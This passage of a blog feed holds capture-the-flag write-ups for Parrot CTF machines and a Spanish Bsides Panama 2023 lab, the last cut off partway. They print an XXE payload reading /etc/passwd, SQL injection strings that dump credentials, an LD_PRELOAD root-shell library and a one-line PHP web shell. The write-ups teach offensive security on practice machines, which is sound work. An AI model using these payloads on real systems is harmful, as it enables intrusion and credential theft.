<p>Hope you like it and learn something new :)</p>]]></content><author><name>FmF</name></author><category term="unix/linux" /><category term="Parrot Ctf" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ParrotCtf-Pet_Shop/banner.jpg" /><media:content medium="image" url="http://localhost:4000/ParrotCtf-Pet_Shop/banner.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Blogger (Parrot CTF)</title><link href="http://localhost:4000/ParrotCtf-Blogger/" rel="alternate" type="text/html" title="Blogger (Parrot CTF)" /><published>2023-08-14T05:00:00+00:00</published><updated>2023-08-14T05:00:00+00:00</updated><id>http://localhost:4000/ParrotCtf-Blogger</id><content type="html" xml:base="http://localhost:4000/ParrotCtf-Blogger/"><![CDATA[<p><img src="/ParrotCtf-Blogger/1.png" alt="Pwned, lol" /></p>

<p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and capture the flag provider. Their goal is to create the most realistic capture the flag challenges and demonstrate real-world attack scenarios.</p>

<p>This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges.</p>

<h2 id="content">Content:</h2>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#xxe-">XXE</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h2 id="enumeration-">Enumeration üîé:</h2>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p>

<p><img src="/ParrotCtf-Blogger/2.png" /></p>

<p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/ParrotCtf-Blogger/3.png" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/ParrotCtf-Blogger/4.png" /></p>

<p>Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button.</p>

<h2 id="xxe-">XXE üíâ:</h2>

<p>Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis.</p>

<p><img src="/ParrotCtf-Blogger/5.png" /></p>

<p>I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response.</p>

<p><img src="/ParrotCtf-Blogger/6.png" /></p>

<p>Basically, our input is being placed as a XML structure, sooo maybe a <a href="https://portswigger.net/web-security/xxe">XXE (XML External Entity)</a> injection?? let‚Äôs check it out.</p>

<p>We can search for payloads in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">PayloadAllTheThings</a> and I used the clasic XXE to retrieve files.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="p">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="p">?</span><span class="o">&gt;&lt;!</span><span class="no">DOCTYPE</span> <span class="n">root</span> <span class="p">[</span><span class="o">&lt;!</span><span class="no">ENTITY</span> <span class="nb">test</span> <span class="no">SYSTEM</span> <span class="s1">'file:///etc/passwd'</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&gt;&lt;</span><span class="n">root</span><span class="o">&gt;&amp;</span><span class="nb">test</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/root&gt;
</span></code></pre></div></div>

<p><a>IMPORTANT</a>: You need to url encode the ampersand (<code class="language-plaintext highlighter-rouge">&amp;</code>) cause if you don‚Äôt, it will not work. It should be <code class="language-plaintext highlighter-rouge">%26</code>.</p>

<p><img src="/ParrotCtf-Blogger/7.png" /></p>

<p>It works, now searching for the word <a><code class="language-plaintext highlighter-rouge">bash</code></a> we can see two users <code class="language-plaintext highlighter-rouge">jimmy</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>But I and know what?, well we can search for configuration files, the <code class="language-plaintext highlighter-rouge">id_rsa</code> of the user <code class="language-plaintext highlighter-rouge">jimmy</code> (<a>Doesn‚Äôt works</a>), enumerate internal ports and so on‚Ä¶ but let‚Äôs enumerate more the web page.</p>

<p>We can do fuzzing to the web page to search for directories with tools like: <code class="language-plaintext highlighter-rouge">gobuster</code>, <code class="language-plaintext highlighter-rouge">wfuzz</code>, <code class="language-plaintext highlighter-rouge">ffuf</code>, <code class="language-plaintext highlighter-rouge">dirsearch</code>‚Ä¶ but I am going to use <code class="language-plaintext highlighter-rouge">dirsearch</code> in this case.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dirsearch</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.12</span><span class="o">/</span>
</code></pre></div></div>

<p>And we found the <code class="language-plaintext highlighter-rouge">/management</code> directory:</p>

<p><img src="/ParrotCtf-Blogger/8.png" /></p>

<p>We found this note in: <code class="language-plaintext highlighter-rouge">/management/admins/temp</code></p>

<p><img src="/ParrotCtf-Blogger/9.png" /></p>

<p>We found this other note in: <code class="language-plaintext highlighter-rouge">/management/employees/jimmy</code> the same user that we saw earlier.</p>

<p><img src="/ParrotCtf-Blogger/10.png" /></p>

<p>A <code class="language-plaintext highlighter-rouge">id_rsa</code> file in <code class="language-plaintext highlighter-rouge">/home/jimmy/ssh/id_rsa.bak</code>?? üò≥, let‚Äôs try to search the file with the XXE vulnerability.</p>

<p><img src="/ParrotCtf-Blogger/11.png" /></p>

<p>Well with this we can log to the system as the user jimmy with <code class="language-plaintext highlighter-rouge">ssh</code>, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to <code class="language-plaintext highlighter-rouge">400</code> with <code class="language-plaintext highlighter-rouge">chmod 400 id_rsa</code>, and now connect with it:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span> <span class="n">jimmy</span><span class="err">@</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.12</span>
</code></pre></div></div>

<p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p>

<ol>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<p><img src="/ParrotCtf-Blogger/12.png" /></p>

<p>Now we can see the flag üéâ.</p>

<h2 id="privilege-escalation-">Privilege escalation üö©:</h2>

<p>We need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>

<p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p>

<p><img src="/ParrotCtf-Blogger/13.png" /></p>

<p>We can see something interesting: <a><code class="language-plaintext highlighter-rouge">env_keep+=LD_PRELOAD</code></a>.</p>

<p>A quick search in Google tells us that we can escalate privileges with it.</p>

<p>We can go to <code class="language-plaintext highlighter-rouge">/tmp</code> directory and create a exploit like this:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;sys/types.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="c1">#include &lt;unistd.h&gt;</span>

<span class="n">void</span> <span class="n">_init</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">unsetenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD"</span><span class="p">);</span>
	<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Save the file as <code class="language-plaintext highlighter-rouge">whatever.c</code> and to compile it with:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">whatever</span><span class="p">.</span><span class="nf">so</span> <span class="n">whatever</span><span class="p">.</span><span class="nf">c</span> <span class="o">-</span><span class="n">nostartfiles</span>
</code></pre></div></div>

<p>This will create a <code class="language-plaintext highlighter-rouge">whatever.so</code> file that we need it to execute:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="no">LD_PRELOAD</span><span class="o">=</span><span class="sr">/tmp/</span><span class="n">whatever</span><span class="p">.</span><span class="nf">so</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span>
</code></pre></div></div>

<p>And now we are root :)</p>

<p><img src="/ParrotCtf-Blogger/14.png" /></p>

<p>Hope you like it and learn something new :)</p>]]></content><author><name>FmF</name></author><category term="unix/linux" /><category term="Parrot Ctf" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ParrotCtf-Blogger/banner.png" /><media:content medium="image" url="http://localhost:4000/ParrotCtf-Blogger/banner.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Brew Brothers (Parrot CTF)</title><link href="http://localhost:4000/ParrotCtf-Brew_Brothers/" rel="alternate" type="text/html" title="Brew Brothers (Parrot CTF)" /><published>2023-06-03T05:00:00+00:00</published><updated>2023-06-03T05:00:00+00:00</updated><id>http://localhost:4000/ParrotCtf-Brew_Brothers</id><content type="html" xml:base="http://localhost:4000/ParrotCtf-Brew_Brothers/"><![CDATA[<p><img src="/ParrotCtf-Brew_Brothers/BrewBrothers.jpg" alt="We have been pwned..." /></p>

<p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>

<p>This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.</p>

<h2 id="content">Content:</h2>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#sqli-">SQLI</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h2 id="enumeration-">Enumeration üîé:</h2>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p>

<p><img src="/ParrotCtf-Brew_Brothers/ping.png" /></p>

<p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/ParrotCtf-Brew_Brothers/ports.png" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/ParrotCtf-Brew_Brothers/page1.png" /></p>

<p>Well‚Ä¶ nothing, it is a default page of apache2, so let‚Äôs start fuzzing.</p>

<p>You can use whatever fuzzing tool you want, in my case I am going to use <code class="language-plaintext highlighter-rouge">wfuzz</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.32</span><span class="o">/</span><span class="no">FUZZ</span>
</code></pre></div></div>

<p>We are doing a simple fuzzing to find directories and we find <code class="language-plaintext highlighter-rouge">website</code> that seems interesting.</p>

<p><img src="/ParrotCtf-Brew_Brothers/page2.png" /></p>

<p>There is an <code class="language-plaintext highlighter-rouge">about.html</code> page, but it is not interesting.</p>

<p>So let‚Äôs start fuzzing again but this time let‚Äôs search for <code class="language-plaintext highlighter-rouge">.html</code> pages.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.32</span><span class="o">/</span><span class="n">website</span><span class="o">/</span><span class="no">FUZZ</span><span class="p">.</span><span class="nf">html</span>
</code></pre></div></div>

<p>We found these: <code class="language-plaintext highlighter-rouge">contact.html</code> and <code class="language-plaintext highlighter-rouge">search.html</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">contact.html</code> page doesn‚Äôt appear to have any functional or reflected elements where we can inject something.</p>

<p>However the <code class="language-plaintext highlighter-rouge">search.html</code> page is interesting because is trying to get data from something so we can try to test for SQLI.</p>

<h2 id="sqli-">SQLI üíâ:</h2>

<p>So how can we know if this is vulnerable to a SQL injection?, let‚Äôs do a simple injection like <code class="language-plaintext highlighter-rouge">' OR 1=1-- -</code> if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.</p>

<p><img src="/ParrotCtf-Brew_Brothers/sqli1.png" /></p>

<p>Yeah! there is a result of all the entries that are in the actual db.</p>

<p>Let‚Äôs start doing more injections üíâ:</p>

<p>This is to view which fields of output we have control over.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Brew_Brothers/sqli2.png" /></p>

<p>This is to view all the available databases. There, we can see an interesting database name, which is <code class="language-plaintext highlighter-rouge">creds</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">schema_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">schemata</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Brew_Brothers/sqli3.png" /></p>

<p>With this, we can view the table names of the database, and there is only one table, which is named <code class="language-plaintext highlighter-rouge">credentials</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">tables</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"creds"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Brew_Brothers/sqli4.png" /></p>

<p>With this, we can see the column names, which are <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"creds"</span> <span class="n">and</span> <span class="n">table_name</span><span class="o">=</span><span class="s2">"credentials"</span><span class="o">--</span> <span class="o">-</span> 
</code></pre></div></div>

<p><img src="/ParrotCtf-Brew_Brothers/sqli5.png" /></p>

<p>So know that we have enumerating the db let‚Äôs retrive all the usernames and passwords.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s2">":"</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="n">from</span> <span class="n">creds</span><span class="p">.</span><span class="nf">credentials</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Brew_Brothers/sqli6.png" /></p>

<p>With this we can retrive only one credential that is: <code class="language-plaintext highlighter-rouge">charles:pyvzngr</code></p>

<p>You can learn to do this injections <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">here</a>, and remember there is a lot of material out there for you to learn more about SQLI.</p>

<p>So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user ‚Äú<strong>charles</strong>‚Äù.</p>

<h2 id="privilege-escalation-">Privilege escalation üö©:</h2>

<p>Now that we are inside the machine you need to do some things to ensure smooth operation:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">bash</code></li>
  <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<p>We need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>

<p>More info about privilege escalation check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p>

<p><img src="/ParrotCtf-Brew_Brothers/priv1.png" /></p>

<p>We can see that we can execute a python3 script like root user but we can‚Äôt edit it :(</p>

<p><img src="/ParrotCtf-Brew_Brothers/priv2.png" /></p>

<p>The script basically hashes a random value and writes it to a file. It doesn‚Äôt seem to be useful, but we can see that it imports various libraries.</p>

<p>The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:</p>

<p><img src="/ParrotCtf-Brew_Brothers/priv3.png" /></p>

<p>Now, the only thing we need to do to become root is to execute the script with sudo privileges.</p>

<p><img src="/ParrotCtf-Brew_Brothers/priv4.png" /></p>

<p>Hope you like it and learn something new :)</p>]]></content><author><name>FmF</name></author><category term="unix/linux" /><category term="Parrot Ctf" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ParrotCtf-Brew_Brothers/BrewBrothers_short.jpg" /><media:content medium="image" url="http://localhost:4000/ParrotCtf-Brew_Brothers/BrewBrothers_short.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Bsides Panama CTF 2023</title><link href="http://localhost:4000/Bsides-Panama-2023/" rel="alternate" type="text/html" title="Bsides Panama CTF 2023" /><published>2023-02-01T05:00:00+00:00</published><updated>2023-02-01T05:00:00+00:00</updated><id>http://localhost:4000/Bsides-Panama-2023</id><content type="html" xml:base="http://localhost:4000/Bsides-Panama-2023/"><![CDATA[<p><img src="/Bsides-Panama-2023/Bsides-back.png" /></p>

<p>Quiero dar un agradecimiento especial para <code class="language-plaintext highlighter-rouge">Tiz</code> üíñ sin √©l este writeup no hubiera sido posible, dejo por aqu√≠ sus redes sociales.</p>

<ul>
  <li><a href="https://twitter.com/cap_tiz">Twitter</a></li>
  <li><a href="https://www.linkedin.com/in/john-a-kent">Linkedin</a></li>
</ul>

<h3 id="retos">Retos:</h3>

<ul>
  <li><a href="#archivo-de-respaldo-webserver">Archivo de respaldo (WebServer)</a></li>
  <li><a href="#acceso-usuario-webserver">Acceso usuario (WebServer)</a></li>
  <li><a href="#acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer)</a></li>
  <li><a href="#wordpress-webserver-ruta-alternativa">Wordpress (WebServer)</a></li>
  <li><a href="#passwordtxt-webserver2">Password.txt (WebServer2)</a></li>
  <li><a href="#acceso-usuario-webserver2">Acceso usuario (WebServer2)</a></li>
  <li><a href="#acceso-administrativo-webserver2">Acceso administrativo (WebServer2)</a></li>
  <li><a href="#plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2)</a></li>
</ul>

<h3 id="topolog√≠a-de-red">Topolog√≠a de red:</h3>

<p><img src="/Bsides-Panama-2023/bsides/Topologia.png" /></p>

<h1 id="archivo-de-respaldo-webserver">Archivo de respaldo (WebServer):</h1>

<p>Iniciamos el CTF, nos dan √∫nicamente la VPN, as√≠ que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra direcci√≥n IP la m√°scara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24.</p>

<p><img src="/Bsides-Panama-2023/bsides/1.png" /></p>

<p>Teniendo esta red podemos empezar a buscar hosts con el siguiente comando:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.1</span><span class="o">-</span><span class="mi">255</span>
</code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-sp</code> ‚Äì&gt; Habilita la funci√≥n de pingsweep.</li>
</ul>

<p>Podemos notar que encontr√≥ un host.</p>

<p><img src="/Bsides-Panama-2023/bsides/3.png" width="300" /></p>

<p>Manos a la obra, vamos a realizar un escaneo m√°s profundo con el siguiente comando:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">Pn</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.100</span> <span class="o">-</span><span class="n">oN</span> <span class="n">target</span>
</code></pre></div></div>
<p>Nos encontr√≥ los siguientes puertos:</p>

<p><img src="/Bsides-Panama-2023/bsides/5.png" width="300" /></p>

<p>Empezamos enumerando los puertos del servicio Web.</p>

<p>Utilizando el comando <code class="language-plaintext highlighter-rouge">whatweb</code> podemos ver que estamos ante un CentOS y m√°s informaci√≥n sobre la p√°gina Web.</p>

<p><img src="/Bsides-Panama-2023/bsides/6.png" /></p>

<p>Investigando notamos que hay dos servicios Web en los puertos <code class="language-plaintext highlighter-rouge">80</code> y <code class="language-plaintext highlighter-rouge">65400</code>.</p>

<h3 id="servicio-web-en-el-puerto-80">Servicio Web en el puerto 80:</h3>

<p><img src="/Bsides-Panama-2023/bsides/8.png" width="500" /></p>

<p>Al utilizar fuzzing contra esta p√°gina podemos encontrar un archivo <code class="language-plaintext highlighter-rouge">notes.txt</code> el cual contiene informaci√≥n que nos puede ser √∫til m√°s adelante:</p>

<p><img src="/Bsides-Panama-2023/bsides/7.png" width="500" /></p>

<p>Y adem√°s encontramos una ruta <code class="language-plaintext highlighter-rouge">/wordpress</code> la cual contiene una p√°gina en WordPress.</p>

<p><img src="/Bsides-Panama-2023/bsides/12.png" width="500" /></p>

<h3 id="servicio-web-en-el-puerto-65400">Servicio Web en el puerto 65400:</h3>

<p>Nos encontramos con una p√°gina normal.</p>

<p><img src="/Bsides-Panama-2023/bsides/9.png" width="500" /></p>

<p>Viendo la p√°gina Web encontramos un par de credenciales en un post.</p>

<p><img src="/Bsides-Panama-2023/bsides/10.png" width="500" /></p>

<p>Probamos las credenciales contra el panel de administraci√≥n y estamos dentro como admin.</p>

<p>En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la m√°quina.</p>

<p>El archivo que subimos fue el siguiente:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="p">?</span><span class="n">php</span> <span class="nb">system</span><span class="p">(</span><span class="vg">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="sc">?&gt;</span>
</code></pre></div></div>

<p>Al abrir la imagen(<strong>que en realidad es el archivo php malicioso</strong>) y colocar <code class="language-plaintext highlighter-rouge">?cmd=whoami</code> podemos ejecutar comandos y tambi√©n ganar acceso al sistema.</p>

<p><img src="/Bsides-Panama-2023/bsides/13.png" width="500" /></p>

<p>Creamos un index.html en nuestra m√°quina de atacante para hacer la reverse shell.</p>

<p><img src="/Bsides-Panama-2023/bsides/14.png" width="500" /></p>

<p>Despu√©s compartimos el index.html con python3 y nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code>:</p>

<p><img src="/Bsides-Panama-2023/bsides/15.png" width="500" /></p>

<p>Ahora para obtener la reverse shell nos falta hacer lo siguiente:</p>

<p><img src="/Bsides-Panama-2023/bsides/16.png" width="400" /></p>

<p>Estamos dentro como <code class="language-plaintext highlighter-rouge">www-data</code>, hacemos tratamiento de la TTY y listo.</p>

<p><img src="/Bsides-Panama-2023/bsides/17.png" width="200" /></p>

<p>Enumeramos el sistema y con <code class="language-plaintext highlighter-rouge">ss -nat</code> nos damos cuenta de que hay un puerto que no pod√≠amos ver desde el exterior, el cual es <code class="language-plaintext highlighter-rouge">8080</code>, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en <code class="language-plaintext highlighter-rouge">notes.txt</code>.</p>

<p><img src="/Bsides-Panama-2023/bsides/18.png" width="500" /></p>

<p>Realizamos un t√∫nel con <code class="language-plaintext highlighter-rouge">chisel</code> para tener acceso a ese puerto desde nuestra m√°quina.</p>

<p>En nuestra m√°quina lo ponemos as√≠: (<strong>Servidor</strong>)</p>

<p><img src="/Bsides-Panama-2023/bsides/19.png" width="500" /></p>

<p>En la sesi√≥n de www-data lo ponemos de la siguiente manera: (<strong>Cliente</strong>)</p>

<p><img src="/Bsides-Panama-2023/bsides/20.png" width="500" /></p>

